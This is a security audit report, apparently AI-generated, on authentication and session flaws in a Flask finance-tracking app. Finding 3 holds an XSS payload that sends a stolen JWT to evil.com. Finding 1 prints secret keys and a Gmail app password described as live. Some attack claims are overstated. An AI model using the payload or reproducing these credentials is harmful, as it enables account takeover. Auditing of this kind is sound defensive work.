# Security Audit - Finance-Track Application (Advanced)

**Audit Date:** 2026-05-24
**Auditor:** OpenClaude Security Analysis
**Scope:** Authentication, Configuration, Session Security, Token Management
**Application Path:** `/home/anirudh/Documents/Project/Finance-Track`

---

## Executive Summary

This audit identifies **15 vulnerabilities** across authentication, configuration, session management, and cryptographic implementations. Three are **Critical** severity, four are **High**, five are **Medium**, and three are **Low**. The most severe issues involve credential exposure in source control, use of a non-cryptographic PRNG for OTP generation, and JWT token storage in localStorage which is vulnerable to XSS-based theft.

---

## Finding 1: SMTP Credentials and Secret Keys Exposed in `.env` File

**Severity:** Critical
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**OWASP:** A07:2021 - Identification and Authentication Failures

**File:** `/home/anirudh/Documents/Project/Finance-Track/.env`, lines 1-10

**Vulnerable Code:**
```
SECRET_KEY=0585de57119974275f8ba98eaef365f03a9be4cc677ddfaadc2b0a7f6379a5c4
MAIL_PASSWORD=iiqa zkky dajb xvby
JWT_SECRET_KEY=0f764693858a9a910716910eaa7705a2dd3778c6133a6952f6840a0a60e03363
```

**Analysis:** The `.env` file contains live production credentials including a Gmail App Password and cryptographic secret keys. While `.env` is in `.gitignore` (lines 17 and 43), there is no evidence it was never committed. If the repository was initialized before `.gitignore` was created, or if `git add .` was used carelessly at any point, these credentials exist in git history permanently. An attacker with repository access (or a leaked `.env` backup) gains:
- Full email account access (send/receive as `vestureboutiquedesigns@gmail.com`)
- Ability to forge JWT tokens for any user (including admin)
- Ability to forge Flask session cookies

**Exploitation Scenario:** An attacker clones the repository, finds the `.env` file (or recovers it from git history with `git log --all --diff-filter=D -- .env`), extracts the Gmail app password, and uses SMTP to send phishing emails from the legitimate address. They also extract `JWT_SECRET_KEY` to craft tokens for any user ID, gaining full admin access without authentication.

**Remediation:**
```bash
# 1. Rotate ALL exposed credentials immediately
#    - Generate new SECRET_KEY (python -c "import secrets; print(secrets.token_hex(32))")
#    - Generate new JWT_SECRET_KEY
#    - Revoke the Gmail App Password and generate a new one

# 2. Verify .env was never committed
git log --all --diff-filter=A -- .env

# 3. If it was committed, purge from history
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch .env' \
  --prune-empty --tag-name-filter cat -- --all

# 4. Use environment variables or a secrets manager in production
#    Never store production secrets in files on disk
```

---

## Finding 2: OTP Generated with Non-Cryptographic PRNG

**Severity:** Critical
**CWE:** CWE-330 (Use of Insufficiently Random Values)
**OWASP:** A02:2021 - Cryptographic Failures

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/services/email_service.py`, lines 1, 25-27

**Vulnerable Code:**
```python
import random
# ...
def generate_otp():
    """Generate a 6-digit OTP."""
    return ''.join(random.choices(string.digits, k=6))
```

**Analysis:** The `random` module uses the Mersenne Twister PRNG, which is **not** cryptographically secure. After observing ~624 consecutive outputs of `random.getrandbits(32)`, an attacker can reconstruct the internal state and predict all future outputs. For a 6-digit OTP (1,000,000 possibilities), the Mersenne Twister's statistical biases and predictability make brute-force or prediction attacks feasible. The OTP protects password resets and login flows, making this a critical authentication bypass vector.

**Exploitation Scenario:** An attacker requests multiple OTPs in rapid succession, observing the timing and values (if they can intercept email or infer OTP from error messages). With enough samples, they reconstruct the PRNG state and predict the next OTP for any user's password reset flow, achieving account takeover.

**Remediation:**
```python
import secrets
import string

def generate_otp():
    """Generate a cryptographically secure 6-digit OTP."""
    return ''.join(secrets.choice(string.digits) for _ in range(6))
```

---

## Finding 3: JWT Tokens Stored in localStorage (XSS Vulnerable)

**Severity:** Critical
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)
**OWASP:** A04:2021 - Insecure Design

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/static/js/api.js`, lines 11-22

**Vulnerable Code:**
```javascript
getToken() {
    return localStorage.getItem('token');
}

setToken(token) {
    localStorage.setItem('token', token);
}

removeToken() {
    localStorage.removeItem('token');
    localStorage.removeItem('user');
}
```

**Analysis:** JWT tokens and user data are stored in `localStorage`, which is accessible to any JavaScript executing in the same origin. Unlike HttpOnly cookies, localStorage has no protection against XSS attacks. A single XSS vulnerability in any part of the application (including third-party libraries loaded via CDN) allows an attacker to exfiltrate the JWT token. The user object is also stored (line 21-22 of auth.js: `api.setUser(result.data.user)`), leaking email, role, and account status.

**Exploitation Scenario:** An attacker finds an XSS vulnerability in any template (e.g., a reflected or stored XSS in a transaction description field). They inject:
```javascript
fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
```
The attacker now has a valid JWT for the victim, valid for 24 hours, with full API access.

**Remediation:**
```javascript
// Use HttpOnly cookies set by the server instead of localStorage
// In auth.py, set the token as an HttpOnly cookie:
response = make_response(jsonify({...}))
response.set_cookie(
    'access_token', token,
    httponly=True,
    secure=True,       # HTTPS only
    samesite='Strict', # CSRF protection
    max_age=86400      # 24 hours
)
return response

// In api.js, remove Authorization header logic.
// Cookies are sent automatically with requests.
// For logout, the server clears the cookie.
```

---

## Finding 4: No Account Lockout After Failed Login Attempts

**Severity:** High
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**OWASP:** A07:2021 - Identification and Authentication Failures

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/api/auth.py`, lines 119-186

**Vulnerable Code:**
```python
@auth_api.route('/login', methods=['POST'])
@limiter.limit("10 per minute")
def login():
    data = request.get_json()
    email = data.get('email', '').strip().lower()
    password = data.get('password', '')
    # ... no failed attempt tracking, no account lockout ...
    user = User.query.filter_by(email=email).first()
    if not user or not user.check_password(password):
        return jsonify({...}), 401
```

**Analysis:** Rate limiting is IP-based (`10 per minute`), not account-based. An attacker can:
1. Use multiple IP addresses (botnet, proxies, Tor) to bypass the IP-based rate limit entirely
2. Brute-force a specific account by rotating IPs
3. There is no `failed_login_attempts` counter on the User model, no progressive lockout, and no notification to the user

The IP-based rate limit protects the server from volumetric attacks but does **not** protect individual accounts from targeted credential stuffing.

**Exploitation Scenario:** An attacker obtains a list of leaked email/password combinations (common in credential stuffing databases). They use a distributed botnet to try 10 combinations per IP per minute across thousands of IPs, testing each combination against every user account. With 10,000 IPs, that's 100,000 attempts per minute with no account lockout.

**Remediation:**
```python
# Add to User model (app/models/user.py):
failed_login_attempts = db.Column(db.Integer, default=0)
locked_until = db.Column(db.DateTime, nullable=True)

# In login endpoint:
if user.locked_until and user.locked_until > datetime.utcnow():
    return jsonify({...}), 423  # Locked

if not user.check_password(password):
    user.failed_login_attempts += 1
    if user.failed_login_attempts >= 5:
        user.locked_until = datetime.utcnow() + timedelta(minutes=15)
    db.session.commit()
    return jsonify({...}), 401

# On successful login:
user.failed_login_attempts = 0
user.locked_until = None
```

---

## Finding 5: Token Blacklist Is In-Memory (Lost on Restart, Not Scalable)

**Severity:** High
**CWE:** CWE-613 (Insufficient Session Expiration)
**OWASP:** A07:2021 - Identification and Authentication Failures

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/extensions.py`, lines 18-20

**Vulnerable Code:**
```python
# In-memory token blacklist for JWT revocation (logout)
# In production, use Redis or a database-backed blacklist
token_blacklist = set()
```

**Analysis:** The token blacklist is a Python `set()` in process memory. This has three critical problems:
1. **Lost on server restart:** All "logged out" tokens become valid again after any deployment or crash
2. **Not shared across workers:** If the app runs with multiple gunicorn workers, each worker has its own blacklist. A token blacklisted in worker A is still valid in worker B
3. **Unbounded growth:** The set grows indefinitely; there is no cleanup of expired token JTIs

**Exploitation Scenario:** A user logs out (their token is added to the in-memory set). The server restarts for a deployment. The attacker, who captured the user's JWT (e.g., from a log or network sniff), can now reuse it because the blacklist was cleared.

**Remediation:**
```python
# Use Redis with TTL matching token expiration
import redis

token_blacklist = redis.Redis(host='localhost', port=6379, db=1)

def revoke_token(jti, exp_timestamp):
    """Add token JTI to blacklist with TTL matching token expiry."""
    ttl = exp_timestamp - int(datetime.utcnow().timestamp())
    if ttl > 0:
        token_blacklist.setex(f"blacklist:{jti}", ttl, "1")

def is_token_revoked(jti):
    return token_blacklist.exists(f"blacklist:{jti}")
```

---

## Finding 6: In-Memory OTP Stores (Not Persistent, Not Thread-Safe)

**Severity:** High
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)
**OWASP:** A04:2021 - Insecure Design

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/api/auth.py`, lines 13-16

**Vulnerable Code:**
```python
# In-memory OTP stores: {email: {'otp': '123456', 'expires_at': datetime, 'attempts': 0}}
# In production, use Redis with TTL
password_reset_otps = {}
login_otps = {}
```

**Analysis:** OTP data is stored in module-level Python dictionaries. Same problems as the token blacklist:
1. Lost on server restart (users cannot complete OTP flows during deployments)
2. Not shared across workers (OTP sent by worker A cannot be verified by worker B)
3. No automatic cleanup of expired entries (memory leak over time)
4. Not thread-safe for concurrent access under multi-threaded servers

Additionally, the OTP for password reset is stored in the same process memory as the application. Any code execution vulnerability gives the attacker access to all pending OTPs.

**Exploitation Scenario:** An attacker initiates a password reset for `admin@example.com`. The OTP is stored in memory. The app server has multiple gunicorn workers. The OTP-generating request hits worker 1, but the verification request hits worker 2, which has no knowledge of that OTP. The legitimate user cannot reset their password, while the attacker (who may be able to pin requests to a specific worker) has an advantage.

**Remediation:**
```python
import redis
import json

otp_store = redis.Redis(host='localhost', port=6379, db=2)

def store_otp(flow, email, otp, ttl_seconds=600):
    key = f"otp:{flow}:{email}"
    data = json.dumps({'otp': otp, 'attempts': 0, 'verified': False})
    otp_store.setex(key, ttl_seconds, data)

def get_otp(flow, email):
    key = f"otp:{flow}:{email}"
    raw = otp_store.get(key)
    return json.loads(raw) if raw else None
```

---

## Finding 7: OTP Comparison Is Not Constant-Time

**Severity:** High
**CWE:** CWE-208 (Observable Timing Discrepancy)
**OWASP:** A02:2021 - Cryptographic Failures

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/api/auth.py`, lines 329, 468, 535

**Vulnerable Code:**
```python
# Line 329 (verify-login-otp):
if otp_data['otp'] != otp:

# Line 468 (verify-reset-otp):
if otp_data['otp'] != otp:

# Line 535 (reset-password):
if otp_data['otp'] != otp:
```

**Analysis:** Python's `!=` operator for strings performs byte-by-byte comparison and returns `False` as soon as the first differing byte is found. This creates a timing side-channel: an attacker can measure response times to determine how many leading digits of the OTP are correct. For a 6-digit OTP, this reduces the search space from 1,000,000 to approximately 6 * 10 = 60 guesses (10 possibilities per digit position, measured via timing).

**Exploitation Scenario:** An attacker requests a password reset OTP, then sends thousands of verification requests with varying OTPs, measuring response time for each. Requests where the first digit is correct take slightly longer. After identifying the first digit, they move to the second, and so on. Each digit takes ~10 requests to identify, totaling ~60 requests per OTP crack.

**Remediation:**
```python
import hmac

def verify_otp(stored_otp, provided_otp):
    """Constant-time OTP comparison."""
    return hmac.compare_digest(stored_otp.encode(), provided_otp.encode())

# Usage:
if not verify_otp(otp_data['otp'], otp):
    return jsonify({...}), 400
```

---

## Finding 8: CSRF Protection Globally Disabled

**Severity:** Medium
**CWE:** CWE-352 (Cross-Site Request Forgery)
**OWASP:** A01:2021 - Broken Access Control

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/__init__.py`, line 20

**Vulnerable Code:**
```python
# CSRF disabled - API uses JWT auth (Bearer tokens), not cookie-based sessions
app.config['WTF_CSRF_ENABLED'] = False
```

**Analysis:** CSRF protection is unconditionally disabled across the entire application. While the comment claims this is acceptable because JWT Bearer tokens are used, this reasoning is flawed:
1. If tokens are moved to HttpOnly cookies (per Finding 3 remediation), CSRF becomes critical
2. The application serves HTML pages via `pages_bp` blueprint, which likely uses session cookies via Flask-Login (`login_manager` is initialized)
3. Any cookie-based session endpoints are completely unprotected against CSRF

**Exploitation Scenario:** An attacker hosts a page with a hidden form that submits to the Finance-Track application. If a logged-in user visits the attacker's page while their session cookie is active, the form auto-submits, performing actions (e.g., changing email, initiating transfers) in the user's context.

**Remediation:**
```python
# Enable CSRF for HTML-serving endpoints, disable for API blueprint only
# In __init__.py:
csrf.init_app(app)

# In the API blueprint registration:
from app.extensions import csrf
csrf.exempt(api_bp)  # Exempt only the API blueprint
```

---

## Finding 9: Debug Mode Defaults to Enabled When FLASK_ENV Is Unset

**Severity:** Medium
**CWE:** CWE-215 (Insertion of Sensitive Information Into Debugging Code)
**OWASP:** A05:2021 - Security Misconfiguration

**File:** `/home/anirudh/Documents/Project/Finance-Track/run.py`, lines 8, 12-13

**Vulnerable Code:**
```python
config_name = os.environ.get('FLASK_ENV', 'development')
# ...
debug = config_name == 'development'
app.run(debug=debug, host='127.0.0.1', port=5000)
```

**Analysis:** If `FLASK_ENV` is not set, the application defaults to `'development'` config, which enables `DEBUG = True` (line 42 of `config.py`). In debug mode:
1. Werkzeug debugger is active, providing a Python REPL in the browser on any unhandled exception (known RCE vector if accessible)
2. Detailed stack traces are leaked to users
3. Auto-reload is enabled (file system monitoring)

While `host='127.0.0.1'` limits network exposure, any process on the same machine (or a reverse proxy misconfiguration) can access the debugger.

**Exploitation Scenario:** A developer deploys the app on a server but forgets to set `FLASK_ENV=production`. The app runs in debug mode behind nginx. An nginx misconfiguration forwards requests to the Flask debugger endpoint (`/__debugger__`). The attacker uses the Werkzeug debugger console to execute arbitrary Python code on the server.

**Remediation:**
```python
# In run.py - default to production, not development:
config_name = os.environ.get('FLASK_ENV', 'production')

# In config.py - add explicit environment validation:
class Config:
    def __init_subclass__(cls, **kwargs):
        super().__init_subclass__(**kwargs)
        if cls.DEBUG and os.environ.get('FLASK_ENV') != 'development':
            raise RuntimeError("DEBUG mode requires explicit FLASK_ENV=development")
```

---

## Finding 10: Default Secret Key Fallbacks in Non-Production

**Severity:** Medium
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**OWASP:** A05:2021 - Security Misconfiguration

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/config.py`, lines 5-13, 17, 22

**Vulnerable Code:**
```python
def _get_secret(name, fallback='dev-secret'):
    value = os.environ.get(name)
    if not value or value.startswith('dev-'):
        if os.environ.get('FLASK_ENV') == 'production':
            raise ValueError(f"{name} environment variable is required in production...")
        if not value:
            value = fallback
    return value

class Config:
    SECRET_KEY = _get_secret('SECRET_KEY', 'dev-secret-key')
    JWT_SECRET_KEY = _get_secret('JWT_SECRET_KEY', 'dev-jwt-secret')
```

**Analysis:** The fallback mechanism only raises an error when `FLASK_ENV` is explicitly set to `'production'`. Combined with Finding 9 (defaulting to 'development'), any deployment without `FLASK_ENV=production` will silently use `'dev-secret-key'` and `'dev-jwt-secret'` as cryptographic keys. These are well-known default values that any attacker would try first.

**Exploitation Scenario:** An app is deployed on a VPS. The ops team sets `DATABASE_URI` and mail credentials but forgets `FLASK_ENV`, `SECRET_KEY`, and `JWT_SECRET_KEY`. The app runs with `dev-secret-key` and `dev-jwt-secret`. An attacker forges a JWT using `pyjwt.encode({'sub': 'admin-uuid'}, 'dev-jwt-secret')` and gains admin access.

**Remediation:**
```python
def _get_secret(name):
    """Get secret from env. Fail if not set in any environment."""
    value = os.environ.get(name)
    if not value or len(value) < 32:
        raise ValueError(
            f"{name} must be set and at least 32 characters. "
            f"Generate with: python -c \"import secrets; print(secrets.token_hex(32))\""
        )
    return value
```

---

## Finding 11: JWT Token Not Invalidated After Password Reset

**Severity:** Medium
**CWE:** CWE-613 (Insufficient Session Expiration)
**OWASP:** A07:2021 - Identification and Authentication Failures

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/api/auth.py`, lines 548-550

**Vulnerable Code:**
```python
# Update password
user.set_password(new_password)
db.session.commit()
# ... no invalidation of existing tokens
```

**Analysis:** When a user resets their password (via `/reset-password`), only the password is changed. Any existing JWT tokens issued before the reset remain valid until their 24-hour expiration. If an attacker compromised a user's token (e.g., via XSS or network interception), the password reset does not revoke the attacker's access.

**Exploitation Scenario:** An attacker steals a user's JWT via XSS. The user notices suspicious activity and resets their password. The attacker's stolen token remains valid for up to 24 hours, allowing continued access.

**Remediation:**
```python
# After password reset, add a password_changed_at timestamp to the User model
# In User model:
password_changed_at = db.Column(db.DateTime, nullable=True)

# In password reset:
user.set_password(new_password)
user.password_changed_at = datetime.utcnow()
db.session.commit()

# In token_required decorator, after decoding the JWT:
if user.password_changed_at:
    token_iat = datetime.utcfromtimestamp(payload['iat'])
    if token_iat < user.password_changed_at:
        return jsonify({...}), 401  # Token issued before password change
```

---

## Finding 12: Login Endpoint Missing Null Check on Request Body

**Severity:** Medium
**CWE:** CWE-476 (NULL Pointer Dereference)
**OWASP:** A04:2021 - Insecure Design

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/api/auth.py`, lines 163-165

**Vulnerable Code:**
```python
data = request.get_json()
email = data.get('email', '').strip().lower()
password = data.get('password', '')
```

**Analysis:** The `/login` endpoint does not check if `data` is `None` before calling `data.get()`. If a request is sent with an invalid JSON body (e.g., `Content-Type: application/json` with body `not-json`), or with no body at all, `request.get_json()` returns `None`, causing an `AttributeError`. The `/register` endpoint correctly handles this (line 74: `if not data:`), but login, `send-login-otp`, `verify-login-otp`, `forgot-password`, `verify-reset-otp`, and `reset-password` do not.

In debug mode (Finding 9), this leaks a full Python stack trace including source code paths and variable values.

**Exploitation Scenario:** An attacker sends `POST /api/v1/auth/login` with body `malformed`. In debug mode, the Werkzeug debugger shows the full stack trace, revealing internal paths, library versions, and potentially sensitive configuration values.

**Remediation:**
```python
data = request.get_json(silent=True)
if not data:
    return jsonify({
        'success': False,
        'error': {'code': 'INVALID_INPUT', 'message': 'Valid JSON body is required'}
    }), 400
```

Apply this pattern to all endpoints that call `request.get_json()`.

---

## Finding 13: Rate Limiting Uses In-Memory Storage

**Severity:** Low
**CWE:** CWE-770 (Allocation of Resources Without Limits)
**OWASP:** A05:2021 - Security Misconfiguration

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/config.py`, line 38

**Vulnerable Code:**
```python
RATELIMIT_STORAGE_URI = "memory://"
```

**Analysis:** Rate limit counters are stored in process memory. With multiple workers (gunicorn), each worker maintains independent counters. A rate limit of "10 per minute" effectively becomes "10 per minute per worker." If the application runs with 4 workers, an attacker gets 40 attempts per minute.

**Remediation:**
```python
RATELIMIT_STORAGE_URI = "redis://localhost:6379/0"
```

---

## Finding 14: First User Auto-Assigned Admin Role

**Severity:** Low
**CWE:** CWE-269 (Improper Privilege Management)
**OWASP:** A01:2021 - Broken Access Control

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/api/auth.py`, lines 98-100

**Vulnerable Code:**
```python
# First registered user becomes admin automatically
is_first_user = User.query.count() == 0
role = 'admin' if is_first_user else 'user'
```

**Analysis:** The first user to register automatically receives the admin role. If the database is recreated (e.g., during a migration error, backup restore, or development/testing mishap), an attacker who registers first gets admin access to the entire application.

**Exploitation Scenario:** A database migration fails and the ops team recreates the database from a backup that was taken before any users existed. An attacker who discovers the reset (e.g., by monitoring for the registration endpoint to return success again) immediately registers and becomes admin.

**Remediation:**
```python
# Use a CLI command to create the first admin, not auto-registration
@app.cli.command('create-admin')
def create_admin():
    """Create the first admin user."""
    email = input('Admin email: ')
    password = getpass('Admin password: ')
    user = User(name='Admin', email=email, role='admin', is_verified=True)
    user.set_password(password)
    db.session.add(user)
    db.session.commit()
```

---

## Finding 15: Token Blacklist and OTP Stores Grow Unbounded

**Severity:** Low
**CWE:** CWE-770 (Allocation of Resources Without Limits)
**OWASP:** A04:2021 - Insecure Design

**File:** `/home/anirudh/Documents/Project/Finance-Track/app/extensions.py`, line 20
**File:** `/home/anirudh/Documents/Project/Finance-Track/app/api/auth.py`, lines 15-16

**Vulnerable Code:**
```python
# extensions.py
token_blacklist = set()

# auth.py
password_reset_otps = {}
login_otps = {}
```

**Analysis:** None of these in-memory data structures have size limits or cleanup mechanisms. Over time:
- `token_blacklist` grows by one entry per logout (JTI UUIDs, ~36 bytes each)
- OTP stores grow by one entry per password reset or login OTP request
- Expired entries are only cleaned when they are accessed (looked up by email), not proactively

A long-running server accumulates thousands of stale entries, consuming memory.

**Remediation:**
```python
# Use Redis with TTL (as shown in Findings 5 and 6)
# OR implement a periodic cleanup task:

from apscheduler.schedulers.background import BackgroundScheduler

def cleanup_expired_otps():
    now = datetime.utcnow()
    for store in [password_reset_otps, login_otps]:
        expired = [k for k, v in store.items() if v['expires_at'] < now]
        for key in expired:
            del store[key]

# Add to scheduler in __init__.py
scheduler.add_job(cleanup_expired_otps, 'interval', minutes=5)
```

---

## Summary Table

| # | Finding | Severity | CWE | OWASP |
|---|---------|----------|-----|-------|
| 1 | SMTP credentials and secrets in `.env` | Critical | CWE-798 | A07 |
| 2 | OTP uses non-cryptographic PRNG | Critical | CWE-330 | A02 |
| 3 | JWT stored in localStorage (XSS-vulnerable) | Critical | CWE-922 | A04 |
| 4 | No account lockout after failed logins | High | CWE-307 | A07 |
| 5 | Token blacklist is in-memory (lost on restart) | High | CWE-613 | A07 |
| 6 | OTP stores are in-memory (not persistent) | High | CWE-922 | A04 |
| 7 | OTP comparison not constant-time | High | CWE-208 | A02 |
| 8 | CSRF globally disabled | Medium | CWE-352 | A01 |
| 9 | Debug mode defaults to enabled | Medium | CWE-215 | A05 |
| 10 | Default secret key fallbacks | Medium | CWE-798 | A05 |
| 11 | JWT not invalidated after password reset | Medium | CWE-613 | A07 |
| 12 | Missing null check on request JSON body | Medium | CWE-476 | A04 |
| 13 | Rate limiting uses in-memory storage | Low | CWE-770 | A05 |
| 14 | First user auto-assigned admin | Low | CWE-269 | A01 |
| 15 | In-memory stores grow unbounded | Low | CWE-770 | A04 |

---

## Priority Remediation Order

1. **Rotate all credentials** (Finding 1) - Do this immediately
2. **Fix OTP generation** (Finding 2) - One-line fix, high impact
3. **Move tokens to HttpOnly cookies** (Finding 3) - Requires frontend refactor
4. **Add account lockout** (Finding 4) - Add User model fields + login logic
5. **Move blacklist/OTP to Redis** (Finding 5, 6, 13, 15) - Infrastructure change
6. **Use constant-time OTP comparison** (Finding 7) - One-line fix per call site
7. **Fix CSRF configuration** (Finding 8) - Exempt API blueprint only
8. **Fix default config** (Finding 9, 10) - Change defaults to safe values
9. **Invalidate tokens on password change** (Finding 11) - Add timestamp + check
10. **Add null checks** (Finding 12) - Pattern fix across all endpoints

---

*Generated by OpenClaude Security Audit - 2026-05-24*
